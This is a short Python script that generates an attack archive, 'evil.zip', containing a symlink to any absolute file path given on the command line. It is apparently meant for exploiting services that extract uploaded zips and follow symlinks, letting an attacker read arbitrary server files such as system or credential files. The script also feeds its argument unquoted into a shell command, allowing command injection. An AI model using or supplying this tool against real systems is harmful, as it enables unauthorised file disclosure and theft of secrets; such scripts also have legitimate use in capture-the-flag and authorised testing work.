#!/usr/bin/env python3
import sys
import os

if len(sys.argv) == 1:
    print("An argument is needed, with the absolute directory of the file which you would like to access")
else:
    os.system(f"ln -s {sys.argv[1]} evilSymlink && zip -r --symlinks evil.zip evilSymlink && rm evilSymlink")
    print("evil.zip saved in current directory")